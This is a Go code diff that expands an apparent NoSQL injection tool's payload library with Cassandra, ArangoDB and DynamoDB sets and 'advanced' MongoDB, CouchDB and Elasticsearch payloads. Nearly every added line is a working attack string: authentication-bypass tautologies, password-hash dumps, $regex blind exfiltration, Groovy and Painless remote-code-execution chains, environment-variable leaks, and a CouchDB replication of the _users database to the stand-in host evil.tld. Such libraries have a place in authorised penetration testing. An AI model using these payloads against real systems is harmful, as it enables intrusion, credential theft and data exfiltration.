@@ -13,6 +13,9 @@ const (
 	CouchDB       DBType = "couchdb"
 	Elasticsearch DBType = "elasticsearch"
 	Redis         DBType = "redis"
+	Cassandra     DBType = "cassandra"
+	ArangoDB      DBType = "arangodb"
+	DynamoDB      DBType = "dynamodb"
 	Generic       DBType = "generic"
 )
 
@@ -47,6 +50,12 @@ func GetPayloads(dbType DBType) []Payload {
 		return elasticsearchPayloads
 	case Redis:
 		return redisPayloads
+	case Cassandra:
+		return cassandraPayloads
+	case ArangoDB:
+		return arangoDBPayloads
+	case DynamoDB:
+		return dynamoDBPayloads
 	default:
 		return genericPayloads
 	}
@@ -89,6 +98,12 @@ func GetAllPayloads() []Payload {
 	all = append(all, couchDBPayloads...)
 	all = append(all, elasticsearchPayloads...)
 	all = append(all, redisPayloads...)
+	all = append(all, cassandraPayloads...)
+	all = append(all, arangoDBPayloads...)
+	all = append(all, dynamoDBPayloads...)
+	all = append(all, mongoDBAdvancedPayloads...)
+	all = append(all, couchDBAdvancedPayloads...)
+	all = append(all, elasticsearchAdvancedPayloads...)
 	return all
 }
 
@@ -246,4 +261,78 @@ var authBypassPayloads = []Payload{
 
 	// Generic
 	{Value: `{"$where": "1==1"}`, Technique: TechJavaScript, DBType: Generic, Description: "Generic JS auth bypass"},
+}
+
+// --- HackTricks / PayloadAllTheThings knowledge expansion ---
+
+// Cassandra CQL injection. The CQL parser tolerates ALLOW FILTERING
+// and inline comments; UDF (User Defined Function) injection lets
+// authenticated attackers reach a sandboxed JVM.
+var cassandraPayloads = []Payload{
+	{Value: `' OR '1'='1`, Technique: TechBlind, DBType: Cassandra, Description: "CQL OR tautology"},
+	{Value: `' OR 1=1 ALLOW FILTERING--`, Technique: TechBlind, DBType: Cassandra, Description: "ALLOW FILTERING tautology"},
+	{Value: `' OR TOKEN(id) > 0 ALLOW FILTERING--`, Technique: TechBlind, DBType: Cassandra, Description: "TOKEN() partition scan"},
+	{Value: `'; SELECT * FROM system_schema.tables--`, Technique: TechOperator, DBType: Cassandra, Description: "Schema enumeration"},
+	{Value: `'; SELECT role,salted_hash FROM system_auth.roles--`, Technique: TechOperator, DBType: Cassandra, Description: "Hash dump via system_auth.roles"},
+	{Value: `'; CREATE FUNCTION rce(x text) RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE java AS '...';`, Technique: TechJavaScript, DBType: Cassandra, Description: "UDF RCE skeleton (JVM)"},
+}
+
+// ArangoDB AQL injection. AQL is a SQL-like dialect; LET + FOR loops
+// let an attacker enumerate any collection. RETURN_USER() (AQL UDF
+// surface) and the @@request bind-parameter bypass round it out.
+var arangoDBPayloads = []Payload{
+	{Value: `") OR (1==1) RETURN d //`, Technique: TechBlind, DBType: ArangoDB, Description: "AQL boolean tautology"},
+	{Value: `"); RETURN _users //`, Technique: TechOperator, DBType: ArangoDB, Description: "RETURN _users system collection"},
+	{Value: `"); FOR u IN _users RETURN u //`, Technique: TechOperator, DBType: ArangoDB, Description: "Iterate _users"},
+	{Value: `"); FOR d IN _system_db RETURN d //`, Technique: TechOperator, DBType: ArangoDB, Description: "_system_db dump"},
+	{Value: `"); LET pwd = (FOR u IN _users RETURN u.authData.simple.hash) RETURN pwd //`, Technique: TechOperator, DBType: ArangoDB, Description: "Extract hashed passwords"},
+}
+
+// DynamoDB PartiQL injection — UNION-equivalent via OR + comparison.
+// PartiQL is the SQL-compatible front for DynamoDB; misuse occurs
+// when apps concat user input into ExecuteStatement.
+var dynamoDBPayloads = []Payload{
+	{Value: `' OR username IS NOT MISSING--`, Technique: TechBlind, DBType: DynamoDB, Description: "PartiQL not-missing tautology"},
+	{Value: `' OR begins_with(username,'a')--`, Technique: TechBlind, DBType: DynamoDB, Description: "PartiQL begins_with blind enum"},
+	{Value: `' OR attribute_exists(secret)--`, Technique: TechBlind, DBType: DynamoDB, Description: "PartiQL attribute_exists fingerprint"},
+	{Value: `'; SELECT * FROM "users"--`, Technique: TechOperator, DBType: DynamoDB, Description: "Stacked SELECT (multi-statement)"},
+}
+
+// MongoDB advanced — adds blind boolean exfil via $regex letter-by-
+// letter, the $function operator (4.4+) for server-side JS, error-
+// based via $jsonSchema mismatch, and BSON-type confusion.
+var mongoDBAdvancedPayloads = []Payload{
+	{Value: `{"username":"admin","password":{"$regex":"^a"}}`, Technique: TechBlind, DBType: MongoDB, Description: "$regex letter-by-letter blind exfil"},
+	{Value: `{"username":"admin","password":{"$regex":"^.{8,}$"}}`, Technique: TechBlind, DBType: MongoDB, Description: "$regex length fingerprint"},
+	{Value: `{"$function":{"body":"function(){sleep(5000);return true;}","args":[],"lang":"js"}}`, Technique: TechTimeBased, DBType: MongoDB, Description: "MongoDB 4.4+ $function sleep"},
+	{Value: `{"$function":{"body":"function(){return db.users.find().toArray()}","args":[],"lang":"js"}}`, Technique: TechJavaScript, DBType: MongoDB, Description: "MongoDB 4.4+ $function arbitrary read"},
+	{Value: `{"$expr":{"$gt":[{"$strLenCP":"$password"},10]}}`, Technique: TechBlind, DBType: MongoDB, Description: "$expr password-length blind"},
+	{Value: `{"username":{"$gt":"%00"}}`, Technique: TechOperator, DBType: MongoDB, Description: "Null-byte-floor $gt enumeration"},
+	{Value: `{"$jsonSchema":{"properties":{"x":{"type":"number"}}}}`, Technique: TechBlind, DBType: MongoDB, Description: "$jsonSchema validator error leak"},
+}
+
+// CouchDB advanced — admin party detection, _replicate misuse,
+// _changes feed exfil, _session cookie forge.
+var couchDBAdvancedPayloads = []Payload{
+	{Value: `_session`, Technique: TechOperator, DBType: CouchDB, Description: "CouchDB session endpoint"},
+	{Value: `_changes?feed=continuous`, Technique: TechOperator, DBType: CouchDB, Description: "_changes continuous feed (real-time exfil)"},
+	{Value: `_replicate {"source":"http://target/_users","target":"http://evil.tld/exfil"}`, Technique: TechOperator, DBType: CouchDB, Description: "_replicate _users to attacker"},
+	{Value: `_active_tasks`, Technique: TechOperator, DBType: CouchDB, Description: "Active tasks (info leak)"},
+	{Value: `_config`, Technique: TechOperator, DBType: CouchDB, Description: "Config endpoint (admin-party fingerprint)"},
+	{Value: `{"selector":{"$and":[{"_id":{"$gt":null}},{"type":{"$ne":""}}]}}`, Technique: TechJSON, DBType: CouchDB, Description: "Mango $and compound query"},
+	{Value: `{"selector":{"_id":{"$not":{"$exists":false}}}}`, Technique: TechJSON, DBType: CouchDB, Description: "Mango double-negation existence"},
+}
+
+// Elasticsearch Painless RCE — Painless is sandboxed but historically
+// has had escapes (CVE-2014-3120, CVE-2015-1427). Detection markers
+// for both the script context and the sandbox-escape primitives.
+var elasticsearchAdvancedPayloads = []Payload{
+	{Value: `{"script":{"source":"java.lang.Runtime.getRuntime().exec('id')","lang":"groovy"}}`, Technique: TechJavaScript, DBType: Elasticsearch, Description: "Legacy Groovy RCE (CVE-2015-1427)"},
+	{Value: `{"script":{"source":"Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"}}`, Technique: TechJavaScript, DBType: Elasticsearch, Description: "Painless reflection chain"},
+	{Value: `{"script":{"source":"new ProcessBuilder([\"id\"]).start().getInputStream().text"}}`, Technique: TechJavaScript, DBType: Elasticsearch, Description: "Painless ProcessBuilder (older versions)"},
+	{Value: `{"query":{"match_all":{}},"_source":false,"script_fields":{"pwd":{"script":{"source":"java.lang.System.getenv()"}}}}`, Technique: TechJavaScript, DBType: Elasticsearch, Description: "Env-var leak via script_fields"},
+	{Value: `/_msearch`, Technique: TechOperator, DBType: Elasticsearch, Description: "Multi-search endpoint (cross-index probe)"},
+	{Value: `/_search?q=*`, Technique: TechOperator, DBType: Elasticsearch, Description: "Wildcard q= search (no auth check)"},
+	{Value: `/_cat/indices?v`, Technique: TechOperator, DBType: Elasticsearch, Description: "Index enumeration via _cat"},
+	{Value: `/_cluster/state`, Technique: TechOperator, DBType: Elasticsearch, Description: "Cluster state (every node, every index)"},
 }
